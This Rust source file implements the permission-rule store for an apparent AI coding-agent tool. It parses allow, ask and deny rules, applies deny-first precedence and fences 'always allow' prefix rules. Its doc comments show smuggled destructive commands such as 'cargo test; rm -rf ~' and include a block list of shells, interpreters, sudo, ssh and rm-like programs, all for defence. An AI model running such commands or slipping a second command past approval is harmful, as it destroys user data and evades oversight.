//! Tolerant JSON permission-settings store.
//!
//! Loads settings from `<workdir>/.tact/settings.json` (project-scoped)
//! and `$HOME/.tact/settings.json` (global).  Missing or malformed files
//! are soft failures — they produce an empty settings layer rather than
//! aborting startup.  Unknown JSON fields are retained so that updates
//! (performed by later tasks) preserve them.
//!
//! # Rule syntax (Task 2)
//!
//! - **Bare rule**: a stable tool name, e.g. `read_file`. Matches any input
//!   for that tool.
//! - **Argument rule**: `tool(field:pattern)` where `field` is a named JSON
//!   input field and `pattern` uses glob matching (`*` / `**` match arbitrary
//!   text, everything else is literal).  Example: `bash(command:cargo test *)`.
//! - **Command-prefix rule**: `tool(field:^words)`, an argument rule whose
//!   pattern opens with `^`. It matches only when *every* shell command in the
//!   field begins with those words. See [`PermissionRule::CommandPrefix`].
//! - **Path-prefix rule**: `tool(field:@components)`, whose pattern opens with
//!   `@`. It matches when the field's path lies under that folder. See
//!   [`PermissionRule::PathPrefix`].
//!
//! Both prefix forms are what the popup's "always allow this pattern" choice
//! records, and both are token-based: their tokens are compared, never
//! glob-matched, so a token may contain any character — including the `)` that
//! ends the rule. That last property is why the prefix forms can express rules
//! the glob form must refuse (see [`PermissionRule::generate`]).
//!
//! # Precedence
//!
//! When multiple rules match the same call, precedence is always
//! `deny > ask > allow`, independent of array order.

use std::path::{Path, PathBuf};

use globset::{Glob, GlobMatcher};
use serde_json::{Map, Value};

use crate::consts::TactPath;
use crate::tool::PermissionPromptPolicy;

// ---------------------------------------------------------------------------
// Rule types — Task 2
// ---------------------------------------------------------------------------

/// The action to apply when a rule (or set of rules) matches a tool call.
///
/// Precedence is always `Deny > Ask > Allow`.  `None` means no rule matched.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum RuleAction {
    /// Allow the tool call (lowest precedence).
    Allow,
    /// Ask the user for confirmation (medium precedence).
    Ask,
    /// Deny the tool call unconditionally (highest precedence).
    Deny,
    /// No matching rule was found.
    None,
}

/// A single parsed permission rule.
///
/// Rules are constructed via [`PermissionRule::parse`] and can then be
/// matched against a `(tool_name, input)` pair.
#[derive(Debug, Clone)]
pub enum PermissionRule {
    /// Bare tool name — matches any input for the named tool.
    /// Example: `read_file`
    Bare {
        /// Canonical stable tool name.
        tool: String,
    },
    /// Argument rule — matches if the named input field is a string and
    /// its value matches the glob pattern.
    /// Example: `bash(command:cargo test *)`
    Argument {
        /// Canonical stable tool name.
        tool: String,
        /// JSON input field to inspect.
        field: String,
        /// Raw glob pattern string (as written in the settings file).
        pattern: String,
        /// Compiled glob matcher.  `None` if the pattern is invalid.
        matcher: Option<GlobMatcher>,
    },
    /// Command-prefix rule — the argument field must be an enumerable shell
    /// command whose every segment begins with `tokens`.
    /// Example: `bash(command:^cargo test)`
    ///
    /// Deliberately *not* glob-matched. A glob `*` spans `;`, so
    /// `bash(command:cargo test *)` also matches `cargo test; rm -rf ~` — and,
    /// because a rule matches the whole string while `deny` rules do too, it
    /// would authorise that second command while the `deny` rule naming it
    /// (whose pattern starts with `rm`, not `cargo`) never got a look in.
    /// Segmenting the command and requiring every segment to be covered is what
    /// makes this width expressible without that hole.
    CommandPrefix {
        /// Canonical stable tool name.
        tool: String,
        /// JSON input field holding the command.
        field: String,
        /// Leading words every command segment must begin with.
        tokens: Vec<String>,
    },
    /// Path-prefix rule — the argument field must be a workspace-relative path
    /// lying under `components`.
    /// Example: `edit_file(path:@docs)`
    ///
    /// Component-wise, not string-wise: `@src` covers `src/lib.rs` and not
    /// `srcx/lib.rs`, which a string prefix would have got wrong.
    PathPrefix {
        /// Canonical stable tool name.
        tool: String,
        /// JSON input field holding the path.
        field: String,
        /// Folder components the path must begin with.
        components: Vec<String>,
    },
}

impl PermissionRule {
    /// Parse a rule string into a [`PermissionRule`].
    ///
    /// Returns `None` when the string is empty, malformed, or contains
    /// invalid syntax (which is treated as a non-matching rule at match
    /// time — callers should warn during load).
    ///
    /// Grammar (deterministic, case-sensitive):
    /// ```text
    /// rule        = tool | tool "(" field ":" pattern ")"
    /// tool        = non-empty text excluding '(' and ')'
    /// field       = non-empty text excluding ':' and ')'
    /// pattern     = non-empty text excluding ')' | "^" prefix-words
    /// prefix-words = one or more whitespace-separated words
    /// ```
    pub fn parse(s: &str) -> Option<Self> {
        let s = s.trim();
        if s.is_empty() {
            return None;
        }

        // Try argument-rule form: `tool(field:pattern)`
        if let Some(open) = s.find('(') {
            if let Some(close) = s.rfind(')') {
                if close <= open {
                    return None;
                }

                // Reject any non-whitespace trailing content after the
                // final closing `)`.
                if !s[close + 1..].trim().is_empty() {
                    return None;
                }

                let tool = s[..open].trim().to_string();
                if tool.is_empty() {
                    return None;
                }
                // Grammar: `tool` excludes '(' and ')'.
                if tool.contains('(') || tool.contains(')') {
                    return None;
                }

                let inner = &s[open + 1..close];

                if let Some(colon) = inner.find(':') {
                    let field = inner[..colon].trim().to_string();
                    let pattern = inner[colon + 1..].trim().to_string();

                    if field.is_empty() || pattern.is_empty() {
                        return None;
                    }

                    // The two prefix forms are read *before* the delimiter check
                    // below, and that order is the whole point: their tokens are
                    // compared rather than glob-matched, and the rule ends at
                    // the final `)`, which `rfind` above already located. So a
                    // token containing a `)` or a `(` round-trips here where the
                    // glob form cannot hold one at all.
                    if let Some(words) = pattern.strip_prefix('^') {
                        let tokens: Vec<String> =
                            words.split_whitespace().map(str::to_string).collect();
                        if tokens.is_empty() {
                            return None;
                        }
                        return Some(PermissionRule::CommandPrefix {
                            tool,
                            field,
                            tokens,
                        });
                    }
                    if let Some(folder) = pattern.strip_prefix('@') {
                        let components = path_components(folder);
                        if components.is_empty() {
                            return None;
                        }
                        return Some(PermissionRule::PathPrefix {
                            tool,
                            field,
                            components,
                        });
                    }

                    // The glob form keeps the restriction: a pattern containing
                    // `)` cannot be told apart from the rule's terminator by eye
                    // when it is read back out of the settings file.
                    if inner.contains(')') {
                        return None;
                    }

                    // Compile the glob pattern; invalid patterns become
                    // non-matching (matcher = None).
                    let matcher = Glob::new(&pattern).ok().map(|g| g.compile_matcher());

                    return Some(PermissionRule::Argument {
                        tool,
                        field,
                        pattern,
                        matcher,
                    });
                }
                // No colon inside parens — malformed argument rule.
                return None;
            }
            // Unmatched or nested parens — malformed.
            return None;
        }

        // Bare tool form: no parentheses allowed.
        if s.contains(')') {
            return None;
        }

        Some(PermissionRule::Bare {
            tool: s.to_string(),
        })
    }

    /// Check whether this rule matches a tool call.
    ///
    /// - A bare rule matches if the tool name is equal.
    /// - An argument rule matches if the tool name is equal AND the named
    ///   input field exists, is a JSON string, and its value matches the
    ///   compiled glob pattern.  If the pattern was invalid (matcher is
    ///   `None`), the rule never matches.
    pub fn matches(&self, tool_name: &str, input: &Value) -> bool {
        match self {
            PermissionRule::Bare { tool } => tool == tool_name,
            PermissionRule::Argument {
                tool,
                field,
                matcher,
                ..
            } => {
                if tool != tool_name {
                    return false;
                }
                let matcher = match matcher {
                    Some(m) => m,
                    None => return false, // Invalid pattern — never matches
                };
                match input.get(field) {
                    Some(Value::String(val)) => matcher.is_match(val.as_str()),
                    _ => false,
                }
            }
            PermissionRule::CommandPrefix {
                tool,
                field,
                tokens,
            } => {
                if tool != tool_name {
                    return false;
                }
                let Some(Value::String(command)) = input.get(field) else {
                    return false;
                };
                // A command whose segments cannot be enumerated cannot be
                // covered by a prefix — ask, rather than assume.
                let Some(segments) = crate::shell::command_segments(command) else {
                    return false;
                };
                // Every segment, or none: a rule that covered only the first
                // would authorise the rest without the user ever seeing it.
                !segments.is_empty()
                    && segments
                        .iter()
                        .all(|segment| segment_starts_with(segment, tokens))
            }
            PermissionRule::PathPrefix {
                tool,
                field,
                components,
            } => {
                if tool != tool_name {
                    return false;
                }
                let Some(Value::String(path)) = input.get(field) else {
                    return false;
                };
                // Component-wise, so `@src` covers `src/lib.rs` and not
                // `srcx/lib.rs`. A `..` component simply fails to match the
                // stored prefix, which is the closed direction.
                let actual = path_components(path);
                actual.len() >= components.len()
                    && actual
                        .iter()
                        .zip(components)
                        .all(|(component, expected)| component == expected)
            }
        }
    }

    /// Return the tool name this rule governs.
    pub fn tool_name(&self) -> &str {
        match self {
            PermissionRule::Bare { tool }
            | PermissionRule::Argument { tool, .. }
            | PermissionRule::CommandPrefix { tool, .. }
            | PermissionRule::PathPrefix { tool, .. } => tool,
        }
    }

    /// Return the canonical string representation of this rule.
    pub fn to_rule_string(&self) -> String {
        match self {
            PermissionRule::Bare { tool } => tool.clone(),
            PermissionRule::Argument {
                tool,
                field,
                pattern,
                ..
            } => format!("{}({}:{})", tool, field, pattern),
            PermissionRule::CommandPrefix {
                tool,
                field,
                tokens,
            } => format!("{}({}:^{})", tool, field, tokens.join(" ")),
            PermissionRule::PathPrefix {
                tool,
                field,
                components,
            } => format!("{}({}:@{})", tool, field, components.join("/")),
        }
    }

    /// Generate a permission rule from a tool metadata policy and current input.
    ///
    /// Returns `None` when no rule that is **narrower than the whole tool** can
    /// be expressed from this input, in which case the caller must record
    /// nothing:
    ///
    /// - `Json`: the prompt was tool-wide, so a bare rule is exactly what the
    ///   user answered — `Some(Bare)`.
    /// - `Command` / `Path` / `Question` / `PatchTarget`: the prompt named a
    ///   specific argument, so the rule has to name it too. If the field is
    ///   absent, is not a string, or its value contains a rule-grammar
    ///   delimiter (`(`, `)`, `:` — the pattern is embedded in
    ///   `tool(field:pattern)`), there is no way to say "this argument and not
    ///   the others", and falling back to a bare rule would grant **more** than
    ///   the user was asked about.
    ///
    /// That last case is not hypothetical: `bash` on any command containing a
    /// colon (`git commit -m "fix: thing"`) used to generate a bare `bash`
    /// rule, so one click on "Always allow this tool" permitted every future
    /// shell command in every session.
    #[must_use]
    pub fn generate(
        tool_name: &str,
        policy: PermissionPromptPolicy,
        input: &Value,
    ) -> Option<Self> {
        if matches!(policy, PermissionPromptPolicy::Json) {
            return Some(PermissionRule::Bare {
                tool: tool_name.to_string(),
            });
        }

        let (field, value) = policy.generate_key(input)?;
        if value.contains('(') || value.contains(')') || value.contains(':') {
            tracing::warn!(
                "Not remembering a permission rule for {tool_name}: its {field} value contains a \
                 rule-grammar delimiter, and a tool-wide rule would be broader than the prompt \
                 the user answered."
            );
            return None;
        }

        // Use the value as an exact glob pattern (no wildcard insertion unless
        // already present). Compiled immediately so the returned rule can be
        // matched without round-tripping through `parse()`.
        let matcher = Glob::new(&value).ok().map(|g| g.compile_matcher());
        Some(PermissionRule::Argument {
            tool: tool_name.to_string(),
            field: field.to_string(),
            pattern: value,
            matcher,
        })
    }

    /// Build the prefix rule behind the popup's "always allow this pattern"
    /// choice, dispatching on what kind of value the prompt is about.
    ///
    /// One entry point, because the popup offers one choice: whether a rule can
    /// be built for *this call* is a single question, and the option's presence
    /// and the rule it previews both come from it. A `Path` prompt yields a
    /// folder rule, a `Command` prompt a program rule, and anything else
    /// (`Json`, `PatchTarget`, `Question`) yields nothing.
    #[must_use]
    pub fn generate_prefix(
        tool_name: &str,
        policy: PermissionPromptPolicy,
        input: &Value,
    ) -> Option<Self> {
        match policy {
            PermissionPromptPolicy::Command { field } => {
                Self::generate_command_prefix(tool_name, field, input)
            }
            PermissionPromptPolicy::Path { field } => {
                Self::generate_path_prefix(tool_name, field, input)
            }
            PermissionPromptPolicy::Json
            | PermissionPromptPolicy::Question { .. }
            | PermissionPromptPolicy::PatchTarget { .. } => None,
        }
    }

    /// The "this program, with this subcommand" rule.
    ///
    /// Broader than [`Self::generate`] by design — that is what the option is
    /// for — and therefore fenced on every side that can be fenced:
    ///
    /// - **Only one enumerable segment.** A compound command
    ///   (`cargo test && rm -rf ~`) has no prefix that describes what it does,
    ///   and a command the shell can pull another command out of — a
    ///   substitution — is refused outright
    ///   (see [`crate::shell::command_segments`]).
    /// - **At least two words, and the second is not a flag.** One word would
    ///   make `^cargo` or `^git` "run anything this program can run", which is
    ///   the width the option exists to avoid; a flag in second position makes
    ///   the prefix name an option rather than a capability (`^git -c`, and
    ///   `-c` is how a pager becomes a shell). The program must be a bare name
    ///   — no `/`, no `=` — so `./deploy.sh` and `FOO=1 cargo` are not
    ///   prefix-shaped.
    /// - **[`UNSAFE_PREFIX_PROGRAMS`].** Programs whose purpose is to run other
    ///   code, or to reach another shell or user, never get a prefix: a rule
    ///   for `sh`, `python`, `find`, `sed`, `env`, `xargs` or `sudo` would be a
    ///   tool-wide allow wearing a narrower costume.
    ///
    /// What is *not* fenced, and cannot be: a prefix for a build tool
    /// (`cargo test`, `npm run build`) trusts that project's own build
    /// configuration, because a `build.rs` and an npm `postinstall` run
    /// arbitrary code. That is the trade the option exists to offer, which is
    /// why the popup shows the rule it is about to record rather than recording
    /// one silently.
    fn generate_command_prefix(
        tool_name: &str,
        field: &'static str,
        input: &Value,
    ) -> Option<Self> {
        let command = input.get(field)?.as_str()?;

        // Exactly one segment, and one the shell cannot run a second command
        // out of.
        let segments = crate::shell::command_segments(command)?;
        let [segment] = segments.as_slice() else {
            return None;
        };

        let words: Vec<String> = segment.split_whitespace().map(str::to_string).collect();
        if words.len() < PREFIX_TOKENS {
            return None;
        }
        let program = words[0].as_str();
        let bare_name = program
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '+'))
            && !program.contains('=')
            && !program.is_empty();
        if !bare_name || UNSAFE_PREFIX_PROGRAMS.contains(&program) {
            return None;
        }
        if words[1].starts_with('-') {
            return None;
        }

        Some(PermissionRule::CommandPrefix {
            tool: tool_name.to_string(),
            field: field.to_string(),
            tokens: words[..PREFIX_TOKENS].to_vec(),
        })
    }

    /// The "this folder" rule, for the file tools.
    ///
    /// A folder is a much smaller ask than a program: nothing here can be
    /// talked into running other code, so the fences are about *scope*:
    ///
    /// - **Workspace-relative only.** An absolute path, or one starting `~`, or
    ///   one containing `..`, is the sensitive-target guard's territory — a rule
    ///   that pre-approved one would route around the guard's own prompt.
    /// - **At least two components.** A single component is a file at the
    ///   workspace root, and the exact rule ("always allow this tool") already
    ///   covers exactly that file. What is left is a folder, which is the
    ///   complement the exact rule cannot express.
    /// - **Not a dot-directory.** `.git` holds hooks that run on the next git
    ///   command, so a persisted rule for it would be an arbitrary-execution
    ///   grant wearing a path's clothes. `.tact` holds the settings file these
    ///   rules are written to.
    fn generate_path_prefix(tool_name: &str, field: &'static str, input: &Value) -> Option<Self> {
        let raw = input.get(field)?.as_str()?.trim();
        if raw.starts_with('~') || raw.starts_with('/') {
            return None;
        }
        let components = path_components(raw);
        if components.len() < 2 {
            return None;
        }
        let folder = &components[..components.len() - 1];
        if folder.iter().any(|component| component == "..") || folder[0].starts_with('.') {
            return None;
        }

        Some(PermissionRule::PathPrefix {
            tool: tool_name.to_string(),
            field: field.to_string(),
            components: folder.to_vec(),
        })
    }
}

/// How many leading words the "always allow this program" rule covers.
///
/// Two, not one: a single word is a whole-program allow — `^cargo`, `^git` —
/// which is exactly the width the option exists to avoid.
const PREFIX_TOKENS: usize = 2;

/// Programs a prefix rule is never generated for.
///
/// Two families, for two different reasons:
///
/// - **Runners.** A shell, an interpreter, or a wrapper whose purpose is to run
///   whatever its arguments name (`sh`, `python`, `env`, `xargs`, `find
///   -exec`, `sed -e …/e`, `awk system()`). A prefix for one of those is a
///   tool-wide allow wearing a narrower costume.
/// - **Irreversible.** Commands where remembering a prefix is a footgun the
///   user cannot scope — `^rm -rf` names no path. This mirrors the reference
///   CLI-approval flow's "never propose a prefix rule for `rm`".
///
/// Not exhaustive, and not intended to be: a program with an "execute this"
/// flag (`tar --to-command`, `rsync -e`) is a moving target. The list holds the
/// ones where the flag is the *point* of the program, and the sensitive-target
/// guard remains the backstop for everything else.
const UNSAFE_PREFIX_PROGRAMS: &[&str] = &[
    // Shells.
    "sh",
    "bash",
    "zsh",
    "fish",
    "dash",
    "ksh",
    "csh",
    "tcsh",
    "ash",
    "busybox",
    // Interpreters and runtimes that take code in their arguments.
    "python",
    "python2",
    "python3",
    "node",
    "nodejs",
    "deno",
    "bun",
    "ruby",
    "perl",
    "php",
    "lua",
    "luajit",
    "rscript",
    "julia",
    "swift",
    "osascript",
    "pwsh",
    "powershell",
    // Wrappers whose argument list is the real command.
    "env",
    "xargs",
    "nohup",
    "setsid",
    "time",
    "timeout",
    "nice",
    "stdbuf",
    "command",
    "builtin",
    "eval",
    "exec",
    "source",
    ".",
    // Escalation and indirection into another context.
    "sudo",
    "su",
    "doas",
    "ssh",
    "nsenter",
    "docker",
    "podman",
    "kubectl",
    "systemd-run",
    "tar",
    "rsync",
    // Programs that execute through a flag.
    "find",
    "sed",
    "awk",
    "gawk",
    "mawk",
    // Irreversible.
    "rm",
    "rmdir",
    "shred",
    "dd",
    "mkfs",
    "mkswap",
    "truncate",
    "chmod",
    "chown",
    "chgrp",
];

/// Split a path into its components, dropping a leading `./`.
///
/// Used by both the generator and the matcher, so the rule a user approves and
/// the paths it covers are read the same way. Dropping `./` widens nothing: it
/// is the same location spelled differently.
fn path_components(value: &str) -> Vec<String> {
    let value = value.trim();
    let value = value.strip_prefix("./").unwrap_or(value);
    value
        .split('/')
        .filter(|component| !component.is_empty())
        .map(str::to_string)
        .collect()
}

/// Whether `segment`'s own words begin with `tokens`.
///
/// Word-wise, not string-wise, so `^cargo test` covers `cargo test --lib` and
/// does not cover `cargo testing`.
fn segment_starts_with(segment: &str, tokens: &[String]) -> bool {
    let words: Vec<&str> = segment.split_whitespace().collect();
    words.len() >= tokens.len() && words.iter().zip(tokens).all(|(word, token)| word == token)
}

/// A collection of parsed rules grouped by action, with precedence-aware
/// evaluation.
///
/// Rules are stored as pre-parsed [`PermissionRule`] instances so that
/// matching is efficient and malformed rules are handled at load time.
#[derive(Debug, Clone)]
pub struct EffectiveRules {
    allow: Vec<PermissionRule>,
    ask: Vec<PermissionRule>,
    deny: Vec<PermissionRule>,
}

impl EffectiveRules {
    /// Build an [`EffectiveRules`] collection from raw rule strings.
    ///
    /// Invalid/malformed rule strings are silently skipped (callers may
    /// warn during loading).
    pub fn from_lists(allow: &[String], ask: &[String], deny: &[String]) -> Self {
        let parse_list = |list: &[String]| -> Vec<PermissionRule> {
            list.iter()
                .filter_map(|s| PermissionRule::parse(s))
                .collect()
        };

        EffectiveRules {
            allow: parse_list(allow),
            ask: parse_list(ask),
            deny: parse_list(deny),
        }
    }

    /// Evaluate the effective action for a tool call.
    ///
    /// Precedence: if any deny rule matches → `Deny`; else if any ask rule
    /// matches → `Ask`; else if any allow rule matches → `Allow`; else
    /// `None`.
    pub fn action(&self, tool_name: &str, input: &Value) -> RuleAction {
        // Deny has highest precedence.
        for rule in &self.deny {
            if rule.matches(tool_name, input) {
                return RuleAction::Deny;
            }
        }
        // Ask has medium precedence.
        for rule in &self.ask {
            if rule.matches(tool_name, input) {
                return RuleAction::Ask;
            }
        }
        // Allow has lowest precedence.
        for rule in &self.allow {
            if rule.matches(tool_name, input) {
                return RuleAction::Allow;
            }
        }
        RuleAction::None
    }
}

/// One settings file, parsed.
///
/// A layer is what `load_from` merges: the project file wins where it speaks,
/// the global file fills the rest.
#[derive(Debug, Clone, Default)]
struct Layer {
    /// `None` when the file was missing or malformed.
    doc: Option<Value>,
    allow: Vec<String>,
    ask: Vec<String>,
    deny: Vec<String>,
    security: crate::security::SecurityConfig,
}

/// The known permission sections stored in a JSON settings file.///
/// The expected JSON shape is:
/// ```json
/// {
///   "permissions": {
///     "allow": ["tool1", "tool2(...)"],
///     "ask":   ["tool3(...)"],
///     "deny":  ["tool4(...)"]
///   },
///   // … other top-level keys are preserved as-is
/// }
/// ```
#[derive(Debug, Clone)]
pub struct PermissionSettings {
    /// Path to the project settings file (or inferred even if it does not exist yet).
    project_path: PathBuf,

    /// The raw project JSON document.  Starts as `{}` when the file is missing
    /// and retains any unknown top-level and `permissions` fields during updates.
    project_doc: Value,

    /// Effective allow rules (project + global merged).
    allow_rules: Vec<String>,

    /// Effective ask rules (project + global merged).
    ask_rules: Vec<String>,

    /// Effective deny rules (project + global merged).
    deny_rules: Vec<String>,

    /// Effective sensitive-path/redaction config (project + global merged).
    security: crate::security::SecurityConfig,

    /// Cached parsed effective rules, rebuilt whenever raw rule lists change.
    /// Avoids re-parsing every raw rule on every `PermissionManager::check` call.
    cached_effective: EffectiveRules,
}

impl PermissionSettings {
    /// Load permission settings from both global and project locations.
    ///
    /// Missing files → empty layer (no rules, empty document).
    /// Malformed JSON → a warning is emitted and an empty layer is used.
    /// Global rules are loaded first; project rules are merged after so that
    /// project settings take precedence (i.e. the effective policy is
    /// union-merged across both layers, with precedence semantics handled
    /// at match time).
    pub fn load(tact_path: &TactPath) -> Self {
        Self::load_from(&tact_path.settings_path(), Self::global_path().as_deref())
    }

    ///
    /// This constructor is designed for tests that want to supply a
    /// specific global path without mutating the process-wide `$HOME`.
    pub fn load_from(project_path: &Path, global_path: Option<&Path>) -> Self {
        let project = Self::load_layer(Some(project_path));
        let global = Self::load_layer(global_path);

        let mut allow_rules = global.allow;
        let mut ask_rules = global.ask;
        let mut deny_rules = global.deny;

        for r in project.allow {
            if !allow_rules.contains(&r) {
                allow_rules.push(r);
            }
        }
        for r in project.ask {
            if !ask_rules.contains(&r) {
                ask_rules.push(r);
            }
        }
        for r in project.deny {
            if !deny_rules.contains(&r) {
                deny_rules.push(r);
            }
        }

        // Use the project document if it was loaded; otherwise default to `{}`.
        // A missing/malformed project file does NOT copy the global raw
        // document, so that a subsequent persist writes a fresh project
        // file rather than inheriting global-only fields/rules.
        let project_doc = project.doc.unwrap_or(Value::Object(Map::new()));

        // Build cached effective rules before moving the rule vectors.
        let cached = EffectiveRules::from_lists(&allow_rules, &ask_rules, &deny_rules);

        Self {
            project_path: project_path.to_path_buf(),
            project_doc,
            allow_rules,
            ask_rules,
            deny_rules,
            security: crate::security::SecurityConfig::merge(&global.security, &project.security),
            cached_effective: cached,
        }
    }

    /// Resolve the global settings path without touching `$HOME` directly
    /// (used by `load` which reads the environment variable).
    fn global_path() -> Option<PathBuf> {
        TactPath::home_settings_path()
    }

    /// Read a single settings file and extract the three rule lists.
    ///
    /// Returns `(doc, allow, ask, deny)` where `doc` is `None` when the file
    /// could not be read or parsed.
    /// Read a single settings file and extract everything this store uses.
    ///
    /// Every field is empty when the file is missing or malformed, which is how
    /// the caller is told to treat the layer as absent.
    fn load_layer(path: Option<&Path>) -> Layer {
        let path = match path {
            Some(p) => p,
            None => return Layer::default(),
        };

        let content = match std::fs::read_to_string(path) {
            Ok(c) => c,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                // Missing file is normal — no rules.
                return Layer::default();
            }
            Err(e) => {
                tracing::warn!("Failed to read settings file {:?}: {}", path, e);
                return Layer::default();
            }
        };

        let doc: Value = match serde_json::from_str(&content) {
            Ok(v) => v,
            Err(e) => {
                tracing::warn!("Failed to parse settings file {:?}: {}", path, e);
                return Layer::default();
            }
        };

        let doc_clone = doc.clone();
        let (allow, ask, deny) = extract_rule_lists(&doc);

        Layer {
            doc: Some(doc_clone),
            allow,
            ask,
            deny,
            security: crate::security::SecurityConfig::from_document(&doc),
        }
    }

    /// The effective sensitive-path / redaction configuration (global merged
    /// with project).
    #[must_use]
    pub fn security_config(&self) -> &crate::security::SecurityConfig {
        &self.security
    }

    /// Return the effective allow rules.
    pub fn allow_rules(&self) -> &[String] {
        &self.allow_rules
    }

    /// Return the effective ask rules.
    pub fn ask_rules(&self) -> &[String] {
        &self.ask_rules
    }

    /// Return the effective deny rules.
    pub fn deny_rules(&self) -> &[String] {
        &self.deny_rules
    }

    /// Return all rules combined (allow + ask + deny), in that order.
    /// Useful for introspection.
    pub fn rules(&self) -> Vec<&str> {
        let mut r: Vec<&str> = Vec::with_capacity(
            self.allow_rules.len() + self.ask_rules.len() + self.deny_rules.len(),
        );
        for s in &self.allow_rules {
            r.push(s);
        }
        for s in &self.ask_rules {
            r.push(s);
        }
        for s in &self.deny_rules {
            r.push(s);
        }
        r
    }

    /// Access the raw project JSON document for persistence.
    pub fn project_doc(&self) -> &Value {
        &self.project_doc
    }

    /// Access the project settings path for persistence.
    pub fn project_path(&self) -> &Path {
        &self.project_path
    }

    /// Return a reference to the cached parsed effective rules.
    ///
    /// The cache is rebuilt automatically whenever raw rule lists change
    /// (load, load_from, persist_project_allow), so callers can use this
    /// instead of calling [`EffectiveRules::from_lists`] on every check.
    pub fn cached_effective_rules(&self) -> &EffectiveRules {
        &self.cached_effective
    }

    /// Persist an allow rule to the project settings file.
    ///
    /// Creates parent `.tact` directories as needed, ensures the JSON document
    /// has a `permissions` object with an `allow` array, deduplicates exact
    /// rule strings, and writes atomically via a temporary file + rename.
    ///
    /// **Critical**: `self.project_doc` is never mutated before the rename
    /// succeeds.  A cloned candidate document is built, serialized, and
    /// written; `self.project_doc` is updated only after a successful atomic
    /// rename.  This ensures that a retry after a failed persistence attempt
    /// actually writes the rule rather than silently deduplicating in memory.
    ///
    /// Unknown top-level and `permissions` fields are preserved.  If a known
    /// field (`permissions` or `allow`) has an incompatible type, only that
    /// field is replaced while leaving sibling fields intact.
    ///
    /// Errors are returned to the caller (they must not be silently converted
    /// into permission denials).
    pub fn persist_project_allow(&mut self, rule: &str) -> Result<(), PersistError> {
        // 1. Build a candidate document from the current project_doc (clone).
        let mut candidate = if self.project_doc.is_object() {
            self.project_doc.clone()
        } else {
            Value::Object(Map::new())
        };

        // 2. Ensure `permissions` is an object in the candidate; replace if
        //    incompatible.
        {
            let obj = candidate.as_object_mut().unwrap();

            let needs_permissions_object = match obj.get("permissions") {
                None => true,
                Some(Value::Object(_)) => false,
                Some(_) => {
                    tracing::warn!(
                        "Replacing incompatible `permissions` field in project settings"
                    );
                    true
                }
            };
            if needs_permissions_object {
                obj.insert("permissions".to_string(), Value::Object(Map::new()));
            }

            let permissions = obj.get_mut("permissions").unwrap().as_object_mut().unwrap();

            // 3. Ensure `allow` is an array in the candidate; replace if
            //    incompatible.
            let needs_allow_array = match permissions.get("allow") {
                None => true,
                Some(Value::Array(_)) => false,
                Some(_) => {
                    tracing::warn!("Replacing incompatible `allow` field in project settings");
                    true
                }
            };
            if needs_allow_array {
                permissions.insert("allow".to_string(), Value::Array(vec![]));
            }

            let allow_array = permissions
                .get_mut("allow")
                .unwrap()
                .as_array_mut()
                .unwrap();

            // 4. Deduplicate: only append if the exact rule string is absent.
            let rule_str = rule.to_string();
            let already_present = allow_array
                .iter()
                .any(|v| v.as_str().is_some_and(|s| s == rule_str));
            if already_present {
                return Ok(());
            }
            allow_array.push(Value::String(rule_str));
        }

        // 5. Serialize pretty JSON with trailing newline.
        let json_str = serde_json::to_string_pretty(&candidate)
            .map_err(|e| PersistError::Serialize(e.to_string()))?;
        let json_str = format!("{}\n", json_str);

        // 6. Create parent directory.
        if let Some(parent) = self.project_path.parent() {
            std::fs::create_dir_all(parent).map_err(|e| {
                PersistError::Io(format!("Failed to create directory {:?}: {}", parent, e))
            })?;
        }

        // 7. Write to a uniquely named temp file beside the target (same
        //    directory), ensuring atomic rename.
        let tmp_path = {
            let stem = self
                .project_path
                .file_stem()
                .unwrap_or_default()
                .to_os_string();
            let suffix = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| format!("_{}", d.as_nanos()))
                .unwrap_or_default();
            let new_name = format!("{}{}.tmp", stem.to_string_lossy(), suffix);
            self.project_path.with_file_name(&new_name)
        };

        let wrote = match std::fs::write(&tmp_path, &json_str) {
            Ok(()) => true,
            Err(e) => {
                let _ = std::fs::remove_file(&tmp_path);
                return Err(PersistError::Io(format!(
                    "Failed to write temp file {:?}: {}",
                    tmp_path, e
                )));
            }
        };

        // 8. Rename atomically.  Only on success do we update the in-memory
        //    state (project_doc + allow_rules) so that a subsequent retry
        //    after failure does not silently deduplicate.
        match std::fs::rename(&tmp_path, &self.project_path) {
            Ok(()) => {
                self.project_doc = candidate;
                if !self.allow_rules.contains(&rule.to_string()) {
                    self.allow_rules.push(rule.to_string());
                }
                self.rebuild_cache();
                Ok(())
            }
            Err(e) => {
                if wrote {
                    let _ = std::fs::remove_file(&tmp_path);
                }
                Err(PersistError::Io(format!(
                    "Failed to rename {:?} to {:?}: {}",
                    tmp_path, self.project_path, e
                )))
            }
        }
    }

    /// Rebuild the cached effective rules from the current raw rule lists.
    fn rebuild_cache(&mut self) {
        self.cached_effective =
            EffectiveRules::from_lists(&self.allow_rules, &self.ask_rules, &self.deny_rules);
    }
}

/// Errors that can occur when persisting project settings.
///
/// These errors are distinct from permission-denial and must be surfaced
/// to the caller without altering the permission decision.
#[derive(Debug)]
pub enum PersistError {
    /// I/O error (directory creation, file write, rename).
    Io(String),
    /// JSON serialization error.
    Serialize(String),
}

impl std::fmt::Display for PersistError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PersistError::Io(msg) => write!(f, "I/O error: {}", msg),
            PersistError::Serialize(msg) => write!(f, "Serialization error: {}", msg),
        }
    }
}

impl std::error::Error for PersistError {}

/// Extract the three rule lists from a parsed JSON document.
///
/// If `permissions` is missing, malformed, or the expected arrays hold
/// non-string values, those sections are silently treated as empty.
/// Unknown fields inside `permissions` are retained via the document.
fn extract_rule_lists(doc: &Value) -> (Vec<String>, Vec<String>, Vec<String>) {
    let allow = extract_array(doc, "allow");
    let ask = extract_array(doc, "ask");
    let deny = extract_array(doc, "deny");
    (allow, ask, deny)
}

fn extract_array(doc: &Value, key: &str) -> Vec<String> {
    let permissions = match doc.get("permissions") {
        Some(Value::Object(map)) => map,
        _ => return vec![],
    };

    match permissions.get(key) {
        Some(Value::Array(arr)) => arr
            .iter()
            .filter_map(|v| v.as_str().map(String::from))
            .collect(),
        _ => vec![],
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
